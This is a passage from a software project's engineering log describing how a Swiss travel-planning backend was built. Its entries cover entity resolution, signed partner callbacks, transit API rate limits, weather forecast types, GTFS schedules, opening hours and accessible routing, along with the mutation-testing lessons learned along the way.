unrepresentable — and so would the proof that we avoided it.

### Two axes, and the order they are reported in

A fact observed sixty seconds ago about last summer's timetable is fresh and
inapplicable. A fact observed in March, effective to October, is four months old in
July and exactly right. `temporal-validity.json` already warned that one timestamp
either discards good data or serves expired data.

Applicability is checked **first**, and that is a decision rather than an accident.
When both fail, reporting "stale" sends someone to re-fetch, and re-fetching cannot
fix a fact about the wrong dates.

### What it refuses to decide

`REQ-EVID-005` allows a stale fact to lower confidence *or* block. Blocking is
decided here because it follows from the field class. The confidence **curve** is
not: the module publishes `staleness_ratio` and leaves the shape to the scenario
scorer. A multiplier invented here would be a magic constant in the wrong module —
`BUG-026`'s shape exactly.

### Surprises

**A provisional constant can still be tested.** `DEC-005` has not signed off the
four thresholds, and the instinct after `BUG-026` was to treat any unsigned number
as untestable. But `REQ-DATA-005` does not state a value — it states an **ordering**:
hours and disruptions must expire faster than descriptive content. That is a
property of the table, it is the requirement itself, and it survives whatever
`DEC-005` decides. Test the property the requirement states, not the number somebody
picked.

**The surviving mutant was a boundary nobody had an opinion about.** Nine of ten died
immediately; the tenth flipped `<=` to `<` at exactly `max_age`, and no test
exercised that instant. Inclusive is right — "expires after six hours" should not
expire *at* six hours, and an exclusive bound makes the verdict depend on clock
resolution, so the same fact assessed a microsecond apart would flip. The gap was not
a missing assertion so much as a missing decision.

---

## IMPL-045 — STEP-005.07 — Entity resolution, and a place that could not say where it is

| Field | Value |
| --- | --- |
| Date | 2026-08-18 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-DATA-004 |
| Blast radius | [BR-046](blast-radius/BR-046-entity-resolution.md) (MEDIUM, confidence MEDIUM) |
| Commit | see git log for this entry |
| Graph indexed commit | `5eac52e` — matched HEAD at pre-change |
| Closes | `BUG-027` |

### What was built

`services/ingestion/src/entity_resolution.py`: identifier-first matching, gated
geo-and-name scoring, a provider identifier graph with reversible audited merges,
and a review queue with no way to approve anything automatically. Plus the
`BUG-027` fix in `places/adapter.py`, without which none of it could be written.
Python 925 → **985**.

### The asymmetry that decided every other choice

A missed merge leaves a duplicate in a list. A false merge produces an itinerary
that is internally consistent, carries plausible travel times, and sends the
traveller to the wrong building — silently, because a merged record looks exactly
like a correct one.

So the matcher is not tuned for accuracy. It is tuned so the only automatic answer
is one that cannot be wrong, and everything else is asked about. **The review queue
is the main path, not the exception**, and the measured rate is reported rather than
buried.

### Three decisions worth the space

**Signals are gated, never summed.** The obvious implementation weights distance and
name similarity and merges above a threshold — which is exactly how two branches of
a chain get merged, because an identical name buys enough score to pay for being
400 m apart. Compensation between independent signals *is* the false-merge
mechanism. Each signal clears its own gate or nothing happens.

**Category demotes and never promotes.** A cafe inside a museum sits at the museum's
coordinate under the museum's name; only the declared category separates them. But
"same point and same category, therefore the same place" is wrong in the other
direction — a station concourse holds a dozen venues that all declare `restaurant`.
Both pairs are in the labelled sample, so neither mistake can be introduced later
without a test failing.

**An identifier conflict outranks proximity.** Two records four metres apart with
different Wikidata entities are two sources asserting different identities, not a
near-certain match with a small problem. `REQ-EVID-002` forbids averaging that away,
so it goes to review however close it is. What an identifier is *allowed* to mean is
an allowlist with a stated test: a namespace carries identity only if its
identifiers denote at most one venue. An address, a phone number or a chain website
denotes something **coarser** than a venue, so matching on one merges distinct
venues with the confidence of an exact match.

### What "canonical" means here

One identity, not one set of values. `CanonicalEntity` keeps its members verbatim
and never flattens them. Flattening would make the merge irreversible the moment a
field disagreed, and would resolve conflicting evidence by picking a winner —
`REQ-EVID-002` again, from the other end.

### Measured, and what the measurement is not

Precision **1.000**, zero true duplicates discarded, recall 0.500, review rate
0.538, over 13 labelled pairs. Two metrics rather than one because **precision alone
is satisfiable by merging nothing** — a matcher that answers DISTINCT to everything
scores a perfect 1.000, and what it loses is the duplicates nobody will ever be
asked about.

The sample is hand-written from Swiss venue patterns and **no provider fetch has
been made** — the same disclosure carried through `.02`–`.06`. Every pair in it is a
case a naive matcher gets wrong, so it measures correctness on the hard cases and
says nothing about how often they occur. The 0.538 review rate is an upper bound on
an adversarial sample, not a forecast of production load; at corpus scale it would
be operationally impossible, and the real figure needs a real corpus.

### Surprises

**The graph told me the change was safe and it was wrong.** `impact CanonicalPlace
--include-tests` reported `0 dependants, LOW`. Eleven call sites exist. The test
file is indexed; the cross-file edges from test modules are not. Since no
application code wires `services/` yet, tests are the *only* callers of every
service symbol — so that verdict has been understating the blast radius of
essentially every change in this directory, and it reads exactly like reassurance.
Logged as `RISK-016`; this record's confidence is MEDIUM because of it.

**Writing the next sub-step is how I found the last one's defect.** `BUG-027` was
not visible from inside `.02`: nothing threw, nothing returned a wrong value, 36
tests passed. It became obvious the instant something tried to *use* the record —
`ProviderRecord.from_place` could not be written, because there was no coordinate to
measure and no category to compare. An absence is only visible against the contract
that requires it, and no test read `DC-EXT-001`.

**A guard from `.05` went stale, and this sub-step is what staled it.** The routing
test blocks the names `haversine`, `distance`, `euclidean`, `great_circle`. The
distance function here is `metres_between` — none of those substrings. The
convenience that test exists to keep out of routing's reach had just become
importable without the test noticing. A blocklist only blocks the names somebody
thought of.

**Three mutants survived the first run and all three were real gaps.** The
conflicting-identifier rule was never actually exercised, because the sample's
conflict pair had names similar enough that a different rule caught it anyway. The
category-promotion mistake had no pair that could detect it. And the two-normalisation
name comparison could not be distinguished from one normalisation by any assertion I
had written — it only changes a verdict on **short** names, where `Bär` against
`Baer` scores 0.857 stripped and fails the merge gate, against 1.000 with umlaut
expansion. That number is now pinned, because "it helps with umlauts" is not a claim
anything can check.

---

## IMPL-044 — STEP-005.06 — Deep links, signed callbacks and attribution

| Field | Value |
| --- | --- |
| Date | 2026-08-18 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-BOOK-001, REQ-BOOK-002 |
| Blast radius | [BR-045](blast-radius/BR-045-affiliate-adapter.md) (MEDIUM, confidence HIGH) |
| Commit | see git log for this entry |
| Graph indexed commit | `5656b75` — matched HEAD at pre-change |

### What was built

`services/integrations/src/affiliate/`: deep-link generation with observed
parameter preservation, signed-callback receipt, and attribution records with
nowhere to put a payment credential. Python 881 → **925**.

### Verify before parse is an ordering, not a step

The natural way to write a webhook handler parses the body to find the signature,
then verifies — by which point a JSON parser has consumed attacker-controlled
bytes, which is the entire surface the signature was meant to stand in front of.

So the entry point takes **raw bytes** and returns a parsed payload only after the
HMAC matches, and there is deliberately no function that verifies against a parsed
object. That helper is what everyone reaches for, and reaching for it is the bug.
A test asserts the module's whole public function set, because a new public
function here is a new chance to reintroduce it.

Two consequences worth stating: the signature is over the **exact bytes received**
(re-serialising breaks it, and "fixing" that by canonicalising quietly restores
parse-before-verify), and the **timestamp is inside the signed material** (a window
checked against an attacker-editable timestamp is not a window).

### Two requirements that pull against each other

Replay protection rejects requests that are **old**; idempotency accepts requests
that are **duplicate**. §5 asks for both. A partner retrying after a timeout is
legitimate and must not be treated as an attack.

Resolved by ordering rather than by a special case: age is checked first, so a
duplicate reaching the seen-set is inside the window by construction. Both edges of
the window are enforced — a future-dated callback is rejected too, because without
that an attacker mints a request valid for as long as they chose.

### "No payment credential anywhere" means nowhere to put one

Redaction cannot satisfy `TST-BOOK-002`: it runs after the value is in memory and
one forgotten call from a log. `AttributionRecord` is frozen, slotted and closed —
no `payment_method`, no `card_last_four`, not redacted but **absent**. The same
argument as `service_identities` having no secret column in migration 001.

`reject_payment_fields` refuses rather than strips. A partner sending card data has
changed the contract, and filtering silently means nobody finds out while the value
still passes through our process on the way to being dropped.

### The mutant that could not be killed behaviourally

Replacing `hmac.compare_digest` with `!=` left the entire suite green — correctly,
since a unit test cannot observe a timing side channel. That is the worst state for
a security property: believed to hold, checked by nothing.

So the check moved to where the property lives. A test now asserts
`hmac.compare_digest` appears in `verify_and_parse` and that plain equality against
the signature does not, and with it the mutant dies. Same technique as `.05`'s
assertion that no haversine helper exists: **when behaviour cannot see a property,
the source can.**

### What my own tests caught in my own code

The payment matcher missed **`ccnum`** — a name I had listed in my own
parametrised test and then failed to cover in the regex. The test found it
immediately, which is the argument for naming the cases explicitly rather than
trusting the pattern to be obviously complete.

Also a `None` sentinel where a dataclass `default_factory` belonged, flagged by
mypy as an unreachable branch. The same shape as `.03`'s zero-sentinel bug: a
sentinel drawn from the value's own domain, or a manual `__post_init__` doing what
the language already offers.

---

## IMPL-043 — The transit key is free below a limit, and the limiter is a cost control

| Field | Value |
| --- | --- |
| Date | 2026-08-17 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-DATA-002 (rate limiting), `ADR-016` zero-spend constraint |
| Blast radius | Covered by `BR-038` (the framework this configures); no new capability |
| Commit | see git log for this entry |
| Graph indexed commit | `fc6a6ac` — matched HEAD at pre-change |

### The question and the honest answer

Asked whether the `opentransportdata.swiss` key is free with no paid integration.
**Free — with a cliff**, and the shape matters more than the yes:

| | |
| --- | --- |
| Static GTFS (file-based) | No registration, no payment at all |
| GTFS-RT (service-based) | Free key required; free **below 5 requests per minute** |
| Above the limit | *"These limits can be exceeded, but then costs will be incurred."* Paid tiers from CHF 500/month |

So `ADR-016`'s zero-spend constraint is **not** satisfied by choosing this provider.
It is satisfied by staying under 5 requests per minute.

### That changes what the rate limiter is for

`STEP-005.01` built a `TokenBucket` and a `Quota` and justified them as avoiding a
provider's own limiter — "being refused here is how we avoid being refused there,
where the penalty may be a ban". Under this provider the penalty is **not a ban, it
is an invoice**. A runaway retry loop bills us.

That reframes the limiter from good-citizenship to a commercial control, and it means
its configuration cannot be guessed. The documented figures are now constants beside
the licence record, with their citation and their verification date.

### Why constants rather than a comment

`BUG-026` was precisely this mistake: a forecast horizon justified in a comment
rather than read from the provider, wrong by more than a factor of two, producing the
violation its own module existed to prevent. **A constant describing someone else's
system needs a citation or a test.** These have both — six assertions, including one
that a bucket built from the documented limit refuses the sixth call in a minute,
because that refusal is the intended outcome.

### One reassuring cross-check

`.04` promises minute-level alert freshness at 5 minutes. Five polls a minute allows
one every twelve seconds, so the SLO and the free tier are compatible. Worth
asserting rather than assuming: a freshness promise the licence cannot fund would be
a commitment to overspend, and the test now says so.

### The dispute is settled by the provisioned plan, which outranks both pages

The API Manager issued two credentials, and each shows its own plan:

| Credential | Product | Plan |
| --- | --- | --- |
| 1 | `tedp_gtfs_rt` | `tedp_gtfs_rt_plan` — 5 calls/minute, unlimited quota |
| 2 | `tedp_gtfs_sa` | `tedp_gtfs_sa_plan` — **5 calls/minute**, unlimited quota |

So the GTFS-SA cookbook's "two requests a minute" is stale, and the "Limits and
costs" grouping was right. **A documentation page describes a limit; the plan is the
limit** — it is the artefact the gateway enforces and bills against, which is why it
outranks both pages rather than being a third opinion.

The stale figure is retained rather than deleted. `REQ-EVID-002` retains conflicts,
and a resolved conflict is still evidence about how trustworthy each source proved:
the cookbook was wrong once and may be wrong again.

### Separate credentials mean separate budgets, which I had assumed otherwise

One credential per product, each with its own 5/minute allowance. The published
limits say "per API-key", and with two keys that is two budgets — so polling both
feeds does not halve either, and each connector needs **its own** `TokenBucket`.
Sharing one across both would discard half the allowance for nothing.

I had flagged the opposite as a possible constraint when reading the docs. The
credentials answered it.

### The original dispute, kept for the record

### The provider's own documentation disputes one of these numbers

While confirming the products to subscribe to, two pages disagreed:

| Source | Service Alerts limit |
| --- | --- |
| "Limits and costs" | *"GTFS RT & GTFS RT Service Alerts — 5 requests per minute"* |
| GTFS-SA cookbook | *"a maximum of two requests a minute"*, own endpoint `/la/gtfs-sa` |

Both are the provider's. **`REQ-EVID-002` says conflicting evidence is retained and
never averaged** — a rule written for provider facts inside an evidence pack, and it
applies no less to a number that decides whether this project receives an invoice.
So both readings are recorded as named constants and a test asserts they are **not**
averaged, because an average of two documented claims is a third figure nobody
published.

Code uses the lower. That is not splitting the difference but an asymmetry:
under-polling costs freshness we can measure, over-polling costs money and, past the
limit, the provider's goodwill.

**The dispute blocks nothing.** Even at two polls a minute — one every thirty
seconds — `.04`'s five-minute alert SLO holds comfortably. Had it not, the SLO would
have needed revisiting rather than the limit being rounded up. It is resolvable the
moment a key exists, from the response headers.

### The GTFS-RT figure, by contrast, is corroborated

Two independent sources agree on 5 per minute: the "Limits and costs" page, and the
API Manager's own plan line at subscription time — *"Quota: unlimited, Rate limit:
5 calls / 1 minute(s)"*. A second source appearing in a UI I did not fetch is
better evidence than a second reading of the same page.

### Not the same as Open-Meteo

Free-below-a-limit is not non-commercial. `ADR-016` §2 rejected Open-Meteo because
its free tier forbids commercial use outright — a licence breach at any volume. This
is a volume ceiling on permitted commercial use, which is a different and manageable
thing.

---

## IMPL-042 — Live-provider reconnaissance, DEC-008, and BUG-026

| Field | Value |
| --- | --- |
| Date | 2026-08-17 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-EVID-003, REQ-DATA-005, REQ-A11Y-003, REQ-CONS-006 |
| Blast radius | Covered by `BR-042` (weather) and `BR-044` (routing); no new record — no new capability |
| Commit | see git log for this entry |
| Graph indexed commit | `e4399d2` — matched HEAD at pre-change |
| Bugs closed | [BUG-026](BUG_REGISTER.md) |
| Decisions closed | `DEC-008` — OpenTripPlanner 2, self-hosted (`ADR-018`) |

### Why this happened before STEP-005.06

Five adapters had been built against **no live provider response**. Each sub-step
disclosed that honestly, and disclosure is not closure. The specific worry was that
`.03` makes ensemble uncertainty mandatory — if MeteoSwiss published point values
only, the design was unbuildable and every later sub-step would inherit the mistake.

That question resolved in the design's favour, and a different one turned out to be
a real defect.

### What the reconnaissance established

| Question | Answer |
| --- | --- |
| Does MeteoSwiss publish ensemble spread? | **Yes** — ICON-CH1-EPS 11 members, ICON-CH2-EPS 21. `.03`'s mandatory uncertainty is satisfiable |
| Forecast horizon | **33 h and 120 h.** My shipped default said **ten days** — `BUG-026` |
| Data retention | **24 hours only** after publication |
| API key needed? | **No** for MeteoSwiss and OSM. **Yes** for `opentransportdata.swiss` GTFS-RT |

### BUG-026: the module produced the violation it was built to prevent

`DEFAULT_HORIZON = timedelta(days=10)`, justified in a comment as "the usual limit
for deterministic skill in public models" — a general belief about meteorology
rather than a figure read from the provider.

`.03` exists so a climatological normal is never presented as a forecast. Its whole
argument rests on the horizon check, and a ten-day default waved day seven through —
so the module produced a `REQ-EVID-003` violation **from its own default**. The types
were sound; the constant was wrong. Every test passed because every test used the
same wrong number.

The fix is no default at all. A plausible-looking default is worse than none,
because it is the failure mode that does not announce itself.

### The 24-hour retention is an architectural constraint, not a defect

`REQ-CONS-006` requires a scenario reproducible from its inputs and versions. If the
forecast that produced a scenario is unavailable 24 hours later, **the stored
evidence pack is the only record** — it cannot be re-derived from source.

That is not a bug in anything built so far, and it is a real constraint on
`STEP-010`: the pack must persist the forecast values it used, not a reference to
them. Carried to STEP-010, where evidence-pack assembly is designed.

### What I want from the owner, precisely

**One credential: an `opentransportdata.swiss` API key** for GTFS-RT, obtained free
from their API Manager. It needs an account, which is the owner's to create, and it
goes into `.env` (mode 600, gitignored) — never into chat, the same rule as the Auth0
secret.

Everything else needs nothing: MeteoSwiss and OSM are open, and outbound network from
this machine works.

### What remains unverified, and it is no longer symmetric

`.03`'s ensemble question is settled. Still shapes this code demands rather than facts
about anyone's API: `.02`'s field names, `.04`'s five-minute alert SLO, and `.05`'s
wheelchair profile support. The last is the one that matters most — if OSM step-free
coverage in the chosen corridor is too sparse, the honest answer is to declare
`WHEELCHAIR` unsupported rather than lower the bar, and `.05` was built so that
answer is available.

---

## IMPL-041 — STEP-005.05 — Travel-time matrices and explicit profile support

| Field | Value |
| --- | --- |
| Date | 2026-08-17 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-DATA-002, REQ-A11Y-003 |
| Blast radius | [BR-044](blast-radius/BR-044-routing-adapter.md) (MEDIUM, confidence HIGH) |
| Commit | see git log for this entry |
| Graph indexed commit | `8bf34e0` — matched HEAD at pre-change |

### What was built

`services/routing/src/matrix.py`: a provider-independent profile interface,
explicit profile-support declaration, travel times that cannot exist without
recorded assumptions, and a matrix cache key that includes the licence. Python
843 → **863**.

### The prohibition is the sub-step

*"Silent fallback from wheelchair to walking is prohibited."* If a provider cannot
route step-free and we quietly return walking times, a wheelchair user gets an
itinerary computed for somebody who can take stairs. **It will look correct** —
every duration plausible, the transfer at Bern that needs a footbridge reading as
nine minutes — and there is no way for the person to know. That is what makes it
worse than a refusal: "we cannot route this reliably" is useful.

So `resolve_profile` returns the requested profile **or** a refusal, and the return
type admits no third outcome. `ProfileUnsupported` carries no duration field at
all, not even a nullable one, because a nullable duration is one `or 0` away from
becoming a travel time.

**The disclosure is tested on its wording.** "No step-free data" must not read as
"step-free", so the test requires the text to say access was *not checked*, that
the journey is *not shown as accessible*, and that walking times were *not
substituted*. A correct type with misleading copy would satisfy the requirement's
letter and fail its purpose.

### Two refusals that prevent an impossible plan

**Straight-line distance is not a route**, enforced twice: a non-positive duration
raises, and a test asserts the module exposes no haversine, distance or
great-circle helper — so the substitution cannot be made by reaching for a
convenience that happens to exist. That second test is structural rather than
behavioural, which is unusual and deliberate: the failure mode is somebody adding
the helper later.

**A duration with no recorded assumptions is not evidence.** Walking speed,
transfer buffer and whether a lift was trusted all change the answer, and
`assumptions` is required even when it states the default.

### The cache key carries the licence, and that is not tidiness

A matrix derived from a source with a maximum cache duration must expire on that
source's terms. Keying by mode and window alone serves results past their
permitted retention — a contract breach that looks exactly like a cache hit. With
`ADR-016` leaving the ODbL question open, OSM-derived and
`opentransportdata.swiss`-derived matrices genuinely have different retention rules
and must not share an entry.

### What surprised me

**A stray `__init__.py` made mypy see one file as two modules.** I created
`services/routing/src/__init__.py` out of habit; neither `services/identity/src`
nor `services/integrations/src` has one, because `src` is a path root rather than a
package. Removing it fixed `Source file found twice under different module names`.
Copying a shape from memory rather than from the neighbouring service is the same
mistake as `packages/contracts`' tsconfig in STEP-004.07.

### `DEC-008` is on the table, and did not block

The sub-step's §4 asks for a provider recommendation when it is reached. It has
been, so the recommendation is put to the owner rather than deferred — but the
scope asked for a **provider-independent** interface, so nothing here depends on
the answer. `DEC-008` stays open until confirmed, per `ADR-007`.

---

## IMPL-040 — STEP-005.04 — Transit schedules, calendars, feed pinning and alerts

| Field | Value |
| --- | --- |
| Date | 2026-08-17 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-DATA-002, REQ-NFR-011 |
| Blast radius | [BR-043](blast-radius/BR-043-transit-adapter.md) (MEDIUM, confidence HIGH) |
| Commit | see git log for this entry |
| Graph indexed commit | `bb84631` — matched HEAD at pre-change |

### What was built

`services/integrations/src/transit/`: GTFS service-time handling, service
calendars with exceptions, feed pinning by content hash, stop resolution that
refuses to approximate, and service alerts with a freshness SLO. Python 798 →
**843**.

### A service day is not a calendar day

GTFS writes a 01:30 departure on the night of the 14th as `25:30` on service date
2026-08-14. Both naive readings are wrong in opposite directions: rejecting it
deletes the night network and the gap reads as "no service", while wrapping it to
01:30 today moves every late departure back twenty-four hours — a train that left
last night, which is `REQ-CONS-004` and S1 by definition.

`ServiceTime` is deliberately not a `datetime.time`, because `25:30` is not
representable as one and forcing it there is the coercion that loses the night
network. For a region chosen partly for last-funicular constraints, this is the
specific error that produces a confidently wrong plan.

### The precedence failure is asymmetric, so the code is too

Ignoring a calendar **removal** puts a train that does not run on Christmas Day
into the plan and leaves somebody at a station. Ignoring an **addition** merely
makes the plan worse than necessary. So `runs_on` consults exceptions first and
returns immediately — there is no branch in which the weekly pattern is reachable
after an explicit date has spoken.

### A mutant survived, and it deserved to

Replacing the GTFS noon-minus-twelve anchor with a plain wall-clock midnight did
not fail the suite. The usual justification is that local midnight may not exist on
a spring-forward date, so I went looking for a case — both 2026 Zurich transitions,
plus Havana, Santiago, Beirut and Asunción, whose transitions fall at or near
midnight. **The two anchors produce the identical instant in every one.** Python's
`zoneinfo` normalises a non-existent or ambiguous midnight rather than raising, and
`noon - 12h` lands on the same normalisation.

So I rewrote the docstring. It had claimed the anchor prevents a defect; it now
says the anchor is **specification conformance**, records that I tried and failed
to observe the defect, and points at the test that pins the equivalence so a future
tzdata change becomes a visible failure.

**Reported as 7 of 8 killed, not 8 of 8.** A survivor with a reason is a finding; a
survivor quietly reclassified is the beginning of a habit — and an untested claim
dressed as a verified one is exactly what this repository's records exist to
prevent.

### Feed pinning is by content hash, not version string

Identifiers are not stable across GTFS publications: a `stop_id` can be retired and
reused for a different platform. An evidence pack resolving stored identifiers
against the current feed will one day resolve them against a different stop, and
nothing about that failure looks like one — the itinerary is coherent, the citation
resolves, the platform is wrong. A version string cannot catch a republication that
keeps its label and changes its contents; a content hash can.

---

## IMPL-039 — STEP-005.03 — Weather forecasts, normals, alerts and withdrawal

| Field | Value |
| --- | --- |
| Date | 2026-08-14 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-DATA-002, REQ-DATA-005, REQ-EVID-003, REQ-DATA-003 |
| Blast radius | [BR-042](blast-radius/BR-042-weather-adapter.md) (MEDIUM, confidence HIGH) |
| Commit | see git log for this entry |
| Graph indexed commit | `9a2db57` — matched HEAD at pre-change |

### What was built

`services/integrations/src/weather/`: forecasts that cannot exist without
uncertainty, climate normals as a **separate type**, alerts whose severity is the
provider's, and objective withdrawal as a product state. Python 772 → **798**.

### Two distinctions, and both are types rather than flags

**A normal is not a forecast.** Beyond the horizon the honest answer is a
climatological normal — legitimate input, and not a prediction about next Tuesday.
`REQ-EVID-003` says an estimate is never rendered as confirmed, and returning a
normal through the same type as a forecast is exactly how it gets rendered as one.
So a consumer written only for `Forecast` fails to typecheck rather than quietly
presenting a 30-year average as tomorrow.

**A point forecast is not an input to a simulation.** `18°C` tells a simulator
nothing about how wrong it might be, so it is treated as certain — and this
product compares feasible futures, plural. `Forecast` cannot be constructed
without `Uncertainty`, with no default, because a default is a fabricated
confidence interval. Nothing widens a bare point into "probably ±2°": that would
invent the uncertainty the requirement exists to preserve.

### Withdrawal is a product state, not an error path

When weather is unavailable, three things could happen and two are failures.
Scoring from normals ranks a scenario "weather resilient" on an average presented
as a forecast. Dropping the objective silently is *worse*, because the user still
believes it was applied. So `weather_resilient` is **withdrawn and disclosed**.

`ObjectiveWithdrawn` carries no score field at all — a nullable score is one
`None` check away from ranking as zero, and zero is a position in the ranking. The
disclosure is required and structured by reason, because an outage, an exceeded
horizon and an uncovered region need different copy.

### What mutation testing caught that I had not

**A mutant survived**: measuring the horizon from `now()` instead of `issued_at`.
My test used timestamps near the real present, so both readings agreed. Rewritten
with dates well in the past, which separates them. The property is that **a stored
forecast gives the same answer whenever it is read** — otherwise the same record
is valid at breakfast and invalid at lunch — and the original test could not see it.

**mypy caught a vacuous assertion.** `assert UNKNOWN is not MINOR` is a
non-overlapping identity check: statically always true, so it could never fail.
Same pattern as BUG-020 and BUG-021, this time in new code and caught by a type
checker rather than a later reader. Replaced with the behavioural property — no
provider string is ever promoted into a level a meteorological service did not
assign.

### The licence is why this is MeteoSwiss

`ADR-016` §2 found that Open-Meteo's free tier is explicitly non-commercial, so
using it would be a licence breach rather than a rate-limit problem.
`LicenceRecord` refuses to construct a non-commercial entry at all, so that
mistake cannot be made quietly — and `METEOSWISS` is registered under the same
`opendata.swiss` terms as the rest of the Swiss sources.

---

## IMPL-038 — STEP-005.02 — Places, hours and accessibility adapter

| Field | Value |
| --- | --- |
| Date | 2026-08-13 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-DATA-001, REQ-DATA-005, REQ-PRIV-003 |
| Blast radius | [BR-041](blast-radius/BR-041-places-adapter.md) (MEDIUM, confidence HIGH) |
| Commit | see git log for this entry |
| Graph indexed commit | `9a82fa4` — matched HEAD at pre-change |

### What was built

`services/integrations/src/places/`: a licence register, an opening-hours parser
and an adapter that maps a provider payload to a canonical place with provenance.
Python suite 736 → **772**.

### The sub-step's premise had expired, and that changed the work

`.02` §4 says *"No provider selected (EXT-001). Build against fixtures."* That was
written before `DEC-002` closed. `ADR-016` has since chosen Switzerland and named
the sources, so this is built against **real licences** rather than an abstract
provider — and `ADR-016`'s ODbL finding stops being a document and becomes a field.

`Provenance.licence_id` was added in STEP-004.06 and had no user until now. From
this sub-step ODbL and non-ODbL facts sit side by side in one pack, which is
exactly what the posture decision owed before `STEP-010` will have to act on.

### Unknown is not closed, and that is the whole module

A place with no hours and a place that is shut are different facts, and a boolean
cannot hold both. Collapsing them breaks the solver in **opposite** directions:

- unknown read as **closed** → a feasible plan reported infeasible (`REQ-CONS-005`)
- unknown read as **open** → an itinerary built on a shut place (`REQ-CONS-004`,
  which the bug register defines as **S1 by definition**)

So `Availability` has three states and every consumer must handle the third. The
same rule governs seasons: no applicable window returns UNKNOWN, because a railway
with summer hours and no winter entry tells us nothing about January, and
`CLOSED` would be inventing a fact.

### Refusing to parse is safe; guessing is not

The parser covers a deliberate subset of the OSM `opening_hours` grammar. The full
grammar has public holidays, sunset offsets, week numbers and month ranges, and a
half-correct implementation of that produces confidently wrong hours — which is a
hard-constraint violation, not a display bug.

So anything outside the subset **raises**, and the adapter records the place as
UNKNOWN, which the solver already has to handle. The place is not discarded: its
name and location remain usable and only the hours degrade.

### Midnight, in one place instead of every consumer

`Fr 22:00-02:00` stored as written has `start > end`, and every comparison
downstream silently reverses. It is split at midnight into two same-day intervals,
so `Interval` can enforce `start < end` in its constructor and no consumer needs
to know the rule exists.

### Two refusals worth naming

**A non-commercial licence cannot be recorded at all.** `LicenceRecord` raises
rather than storing one. Open-Meteo's free tier is the live example from
`ADR-016` §2 — CC-BY data, non-commercial terms — and a register entry marked
"unusable" is an invitation to misread it later.

**`ShareAlike` is three-valued.** "We have not read the terms" and "the terms
impose nothing" are different facts, and a boolean loses the first one — which is
how an obligation gets discovered after the data is already in the pack.

### Accessibility is filtered, not mapped

`REQ-PRIV-003` permits declaration only. An unrecognised key is **dropped with a
warning**, never mapped to the nearest neighbour, because a wrong accessibility
fact is worse for the person relying on it than a missing one. An empty list means
*not declared*, never *no features*.

---

## IMPL-037 — STEP-004.09 — Detect documented semantic change

| Field | Value |
| --- | --- |
| Date | 2026-08-13 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-PLAT-008 |
| Blast radius | [BR-040](blast-radius/BR-040-semantic-change.md) (LOW, confidence HIGH) |
| Commit | see git log for this entry |
| Graph indexed commit | `776e385` — matched HEAD at pre-change |
| Delivers | **ENH-001**, accepted by the owner against my recommendation to defer |

### What was built

`semantic_review()` in `tools/contract_diff.py`: a property whose description
changed while its shape did not is reported as `REVIEW REQUIRED`. Contract suite
56 → **65**.

### The insight, and its limit in one sentence

A semantic change is undetectable in general; a **documented** one is not. An
author who changes what a field means and updates its description leaves a
machine-readable trace. This converts "invisible" into "invisible only when
undocumented" — strictly smaller, and not closed. An undocumented meaning change
stays invisible and no tool fixes that.

### I recommended deferring this, and the owner overrode me

Worth recording plainly, because the override was reasonable. My argument was
cost-of-false-positives, not that the gap was acceptable — `CONTRACT_CHANGE_POLICY`
§1 calls this the most dangerous category and it had no automated coverage at all.

So the risk I raised became the acceptance criterion. `ENH-001` said: *"If the
false-positive rate is not driven near zero first, this should not ship."*
**Measured on the live corpus: 0 findings across 54 described properties**, and
that measurement is itself a test — if normalisation ever stops removing
formatting noise, the suite fails rather than the check quietly becoming noise.

### It reports; it does not fail the build

A check that fails on a reworded sentence is one people learn to bypass. `BR-029`
§3 records exactly what that costs here: `gitnexus_query` returns an empty result
that reads like "no such concept exists", and the lesson was that a signal nobody
trusts is worse than no signal.

But a report nobody consumes is equally worthless, so it is wired into
`RELEASE_READINESS_CHECKLIST` §2 — resolved at the moment a semantic change stops
being free — and `CONTRACT_CHANGE_POLICY` §1 now points at the coverage it has
rather than only at the gap.

### Normalisation chosen from measurement, not taste

Four edits change a description's bytes without changing meaning: reflow, emphasis,
code marks, sentence case. Each is normalised away and each has a test asserting
**no** report.

A typo fix still fires. That is accepted rather than engineered around — the report
prints both texts so a reviewer dismisses it in one glance, and guessing which
edits are "trivial" is precisely how a checker starts silently ignoring real ones.

### Two guards on the guard

`test_the_false_positive_rate_is_measured_not_asserted` fails if noise starts
getting through. `test_it_can_still_fire_on_the_real_contract` seeds a genuine
redefinition of `Evidenced.status` and requires it to be caught — because a
detector that reports nothing would satisfy the first test perfectly while
detecting nothing at all.

---

## IMPL-036 — STEP-001.08 — A carried commitment cannot be dropped silently

| Field | Value |
| --- | --- |
| Date | 2026-08-13 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-KG-008, REQ-PLAT-002 |
| Blast radius | [BR-039](blast-radius/BR-039-carried-commitments.md) (LOW, confidence HIGH) |
| Commit | see git log for this entry |
| Graph indexed commit | `34588be` — matched HEAD at pre-change |
| Delivers | **ENH-002**, accepted by the owner 2026-08-13 |

### What was built

`tests/guards/carried-commitments.sh`. A commitment deferred with
`carried to STEP-NNN.MM` cannot reach that target's closure without a disposition
on its own line. Guard meta-suite 61 → **68**.

### The prototype was worth more than the guard

I wrote a throwaway detector and ran it against the real corpus before designing
anything. It killed two designs that would each have shipped and each been wrong.

**"The target must mention the source"** was the obvious rule. `STEP-004.01`
carried the RFC 9457 migration to `STEP-004.04`, and `.04` discharged it by
establishing the carry was *mistaken* — never naming `.01`. Discharge has three
honest shapes (done, withdrawn, re-routed) and only the first resembles doing the
work.

**Then it flagged carries I had already fixed**, because `STEP-002.08` rewrote
those lines to *quote* the old carry while explaining the fix. A live promise and a
historical quotation of one are textually identical. That is the false-positive
class `ENH-002` predicted, and it is why the disposition belongs on the carry line:
whoever resolves a promise annotates the promise, and a quotation is not one.

### It found a commitment with no home

Six carries pointed at closed sub-steps. Five needed annotation. One was live:

**`auth/errors.py` still returns the STEP-002.02 shape, not RFC 9457.**
`STEP-004.01` carried the migration to `.04`; `.04` correctly established it was
not its job — and nobody re-carried it. Two error shapes have coexisted since
STEP-004.01 with the record pointing at a sub-step that had declined the work.

